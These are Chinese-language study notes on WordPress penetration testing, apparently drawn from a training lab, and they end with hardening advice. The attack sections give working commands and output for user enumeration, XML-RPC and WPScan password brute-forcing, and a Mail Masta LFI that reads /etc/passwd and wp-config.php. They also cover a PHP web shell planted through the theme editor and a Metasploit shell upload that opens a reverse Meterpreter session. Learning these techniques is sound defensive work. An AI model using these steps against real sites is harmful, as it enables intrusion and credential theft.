# WordPress 安全评估学习笔记

## 1. WordPress 文件结构

### 1.1 安装环境
WordPress 可以安装在 Windows、Linux 或 Mac OSX 上。本笔记重点介绍 Ubuntu Linux 上的安装。

**前置条件**：完整安装配置 LAMP 栈
- Linux 操作系统
- Apache HTTP 服务器
- MySQL 数据库
- PHP 编程语言

所有文件位于 `/var/www/html` 的 Web 根目录中。

### 1.2 目录结构

```
/var/www/html/
├── index.php                # WordPress 主页入口
├── license.txt              # 版本和许可证信息
├── readme.html
├── wp-activate.php          # 邮件激活处理
├── wp-admin/                # 后端管理界面和登录
├── wp-blog-header.php
├── wp-comments-post.php     # 评论提交处理
├── wp-config.php            # 数据库配置文件（敏感）
├── wp-config-sample.php     # 配置示例
├── wp-content/              # 插件、主题、媒体文件
├── wp-cron.php              # 定时任务
├── wp-includes/             # 核心库函数
├── wp-links-opml.php
├── wp-load.php              # 核心加载器
├── wp-login.php             # 登录页面（可能被重命名）
├── wp-mail.php              # 邮件处理
├── wp-settings.php          # 全局配置加载
├── wp-signup.php            # 用户注册
├── wp-trackback.php         # 反向链接
└── xmlrpc.php               # XML-RPC 接口（已被 REST API 取代）
```

### 1.3 关键文件说明

| 文件 | 功能 | 安全相关性 |
|------|------|----------|
| `wp-config.php` | 数据库凭证和密钥配置 | **高危** |
| `wp-admin/` | 管理员界面 | 高风险目标 |
| `wp-login.php` | 登录页面 | 暴力破解目标 |
| `xmlrpc.php` | XML-RPC 接口 | 可用于暴力攻击 |
| `wp-content/` | 插件和主题 | 可能有漏洞 |

---

## 2. 目录索引漏洞

### 2.1 什么是目录索引

当 Web 服务器配置错误时，用户可直接浏览目录内容。

**示例URL**：
```
http://<target>/wp-content/plugins/mail-masta/
```

### 2.2 检测方法

使用 curl 和 html2text 查看目录列表：
```bash
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```

输出示例：
```
Index of /wp-content/plugins/mail-masta
============================================================
Name                 Last_modified    Size  
amazon_api/          2020-05-13 18:01    -  
inc/                 2020-05-13 18:01    -  
lib/                 2020-05-13 18:01    -  
plugin-interface.php 2020-05-13 18:01  88K  
readme.txt           2020-05-13 18:01 2.2K  
```

### 2.3 风险与防护

**风险**：
- 暴露源代码
- 发现敏感文件
- 识别过时插件版本

**防护**：
- 在 Apache 配置中禁用 `Options Indexes`
- 创建空的 `index.html` 文件
- 合理配置 `.htaccess`

---

## 3. 用户枚举

### 3.1 为什么枚举用户很重要

用户列表是后续攻击的基础：
- 暴力破解密码
- 猜测默认凭据
- 获取后端访问权限
- 进行权限提升

### 3.2 手动枚举方法

**方法一：查看帖子作者**
- 将鼠标悬停在帖子作者链接上
- 浏览器左下角显示用户链接
- 可识别用户 ID 和用户名

**方法二：URL 枚举**
- `/author/username/` 或 `/author/1/`
- 观察 404 和有效页面的差异

---

## 4. 登录和密码暴力破解

### 4.1 攻击向量

一旦掌握用户列表，可通过以下方式发起攻击：

1. **wp-login.php** - 标准登录页面
2. **xmlrpc.php** - XML-RPC API（更快）

### 4.2 使用 xmlrpc.php 测试凭据

#### 4.2.1 正确凭据测试

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

成功响应（HTTP 200）：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
        <array><data>
          <value><struct>
            <member>
              <name>isAdmin</name>
              <value><boolean>1</boolean></value>
            </member>
            <member>
              <name>url</name>
              <value><string>http://blog.inlanefreight.com/</string></value>
            </member>
            <member>
              <name>blogid</name>
              <value><string>1</string></value>
            </member>
            <member>
              <name>blogName</name>
              <value><string>Inlanefreight</string></value>
            </member>
            <member>
              <name>xmlrpc</name>
              <value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value>
            </member>
          </struct></value>
        </data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

#### 4.2.2 错误凭据测试

错误密码返回 `403 faultCode` 错误：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

---

## 5. WPScan 工具

### 5.1 WPScan 简介

[WPScan](https://github.com/wpscanteam/wpscan) 是自动化 WordPress 扫描和枚举工具，可以：
- 检测过时的主题和插件
- 识别已知漏洞
- 枚举用户
- 进行暴力密码攻击

**安装**：
```bash
# Parrot OS 默认安装，或手动安装
gem install wpscan
```

**验证安装**：
```bash
wpscan --hh    # 显示完整帮助
```

### 5.2 基本用法

#### 5.2.1 普通枚举扫描

```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token YOUR_API_TOKEN
```

**--enumerate 参数**：
- `vp` - 易受攻击插件
- `ap` - 所有插件
- `vt` - 易受攻击主题
- `at` - 所有主题
- `u` - 用户枚举
- `m` - 媒体
- `dbe` - 数据库导出

#### 5.2.2 添加 API 密钥

获取 [WPVulnDB](https://wpvulndb.com/) API 令牌（免费版 50 请求/天）：

```bash
wpscan --url http://target --enumerate --api-token YOUR_TOKEN
```

### 5.3 扫描结果示例

WPScan 输出包含：
```
[+] URL: http://blog.inlanefreight.com/
[+] WordPress version 5.3.2
[+] Theme: twentytwenty (outdated)
[+] Vulnerable Plugins:
  - mail-masta 1.0 (LFI, SQL Injection)
  - wp-google-places-review-slider (SQL Injection)
[+] Users Enumerated:
  - admin
  - david
  - roger
```

---

## 6. 利用易受攻击的插件

### 6.1 Mail Masta 插件 LFI 漏洞

**漏洞详情**：
- CVE：Unauthenticated Local File Inclusion (LFI)
- 受影响版本：1.0
- 路径：`/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php`

### 6.2 利用方法

#### 使用浏览器：
```
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

#### 使用 curl：
```bash
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**输出**（/etc/passwd 内容）：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

### 6.3 可读取的其他文件

```bash
# WordPress 配置文件
?pl=/var/www/html/wp-config.php

# Web 服务器配置
?pl=/etc/apache2/apache2.conf

# 应用日志
?pl=/var/log/apache2/access.log
```

---

## 7. 攻击 WordPress 用户

### 7.1 暴力破解工具

**使用 WPScan 暴力破解**：

```bash
# 使用 xmlrpc 方法（更快）
wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
```

**参数说明**：
- `-t 20` - 20 个线程
- `-U admin,david` - 目标用户列表
- `-P passwords.txt` - 密码字典文件
- `--password-attack xmlrpc` - 使用 XML-RPC 攻击

**成功输出**：
```
[SUCCESS] - admin / sunshine1
[i] Valid Combinations Found:
  | Username: admin, Password: sunshine1
```

---

## 8. 通过主题编辑器获取 RCE

### 8.1 前置条件

- 获取 WordPress 管理员凭证
- 选择一个非活跃的主题（避免破坏网站）

### 8.2 利用步骤

#### 步骤 1：登录管理面板
```
http://target/wp-admin/
```

#### 步骤 2：导航到主题编辑器
- 点击 `Appearance` → `Theme Editor`
- 选择一个未使用的主题（如 Twenty Seventeen）

#### 步骤 3：修改 404.php 文件

在 `404.php` 文件开头添加：
```php
<?php system($_GET['cmd']); ?>
```

完整示例：
```php
<?php system($_GET['cmd']); ?>
/**
 * The template for displaying 404 pages (not found)
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 */
```

#### 步骤 4：执行命令

```bash
# 执行 id 命令
curl "http://target/wp-content/themes/twentyseventeen/404.php?cmd=id"

# 输出示例
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
```

### 8.3 其他可用文件

- `footer.php`
- `header.php`
- `sidebar.php`
- 任何非关键的主题文件

---

## 9. 使用 Metasploit 自动化攻击

### 9.1 启动 MSF

```bash
msfconsole
```

### 9.2 使用 wp_admin_shell_upload 模块

#### 搜索模块
```
msf5 > search wp_admin
# 找到: exploit/unix/webapp/wp_admin_shell_upload [0]
```

#### 选择模块
```
msf5 > use 0
msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

#### 查看选项
```
msf5 > options
Module options (exploit/unix/webapp/wp_admin_shell_upload):
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                     yes       WordPress password
  RHOSTS                       yes       Target host(s)
  RPORT      80               yes       Target port
  USERNAME                     yes       WordPress username
  VHOST                        no        HTTP server virtual host
```

#### 配置并执行
```
msf5 > set rhosts blog.inlanefreight.com
msf5 > set username admin
msf5 > set password Winter2020
msf5 > set lhost 10.10.16.8
msf5 > run
```

**成功标志**：
```
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: www-data (33)
```

---

## 10. WordPress 安全最佳实践

### 10.1 更新管理

**定期更新是最重要的防护措施**

#### 启用自动更新

编辑 `wp-config.php`：
```php
// 启用 WordPress 核心自动更新
define('WP_AUTO_UPDATE_CORE', true);

// 启用插件自动更新
add_filter('auto_update_plugin', '__return_true');

// 启用主题自动更新
add_filter('auto_update_theme', '__return_true');
```

### 10.2 插件和主题管理

**安装前检查**：
- 从官方 WordPress.org 下载
- 检查评分和评论数
- 确认最近更新日期
- 检查活跃安装数

**定期维护**：
- 删除未使用的插件和主题
- 监控已安装的软件更新
- 及时删除废弃软件

### 10.3 常用安全插件

#### Sucuri Security
- 安全审计日志
- 文件完整性监控
- 恶意软件扫描
- 黑名单监控

#### iThemes Security
- 双因素认证 (2FA)
- 安全密钥管理
- Google reCAPTCHA
- 用户操作日志

#### Wordfence Security
- 端点防火墙
- 恶意软件扫描
- 实时威胁更新（付费版）
- IP 黑名单（付费版）

### 10.4 用户管理

**最佳实践**：
- 禁用默认 `admin` 用户，创建难以猜测的用户名
- 强制使用强密码
- 启用所有用户的双因素认证 (2FA)
- 基于最小权限原则限制用户访问
- 定期审计用户权限，删除不需要的账户

**风险原因**：
- 用户往往是组织中最薄弱的环节
- 默认用户名是攻击者首选目标

### 10.5 配置管理

**加固措施**：
- 安装防止用户枚举的插件，防止攻击者收集用户名进行密码喷洒
- 限制登录尝试次数，防止暴力破解
- 重命名或隐藏 `wp-login.php`：
  - 重新定位到特定 URI
  - 限制 IP 访问
  - 需要特定引荐来源

### 10.6 其他加固项

- 禁用 XML-RPC（如不需要）
- 禁用文件编辑（删除主题编辑器）
- 隐藏 WordPress 版本号
- 设置正确的文件权限
- 定期备份
- 实施 WAF（Web 应用防火墙）

---

## 11. 学习总结

| 阶段 | 工具/技术 | 输出 |
|------|---------|------|
| 枚举 | WPScan, curl, 目录索引 | 版本、插件、用户列表 |
| 用户识别 | WPScan, URL 分析 | 用户名列表 |
| 凭证获取 | xmlrpc.php, WPScan, 字典 | 有效凭证 |
| 初步访问 | wp-login.php 或 xmlrpc.php | 管理员会话 |
| RCE | 主题编辑器、文件上传 | 命令执行能力 |
| 自动化 | Metasploit, 自定义脚本 | 反向 shell |

---
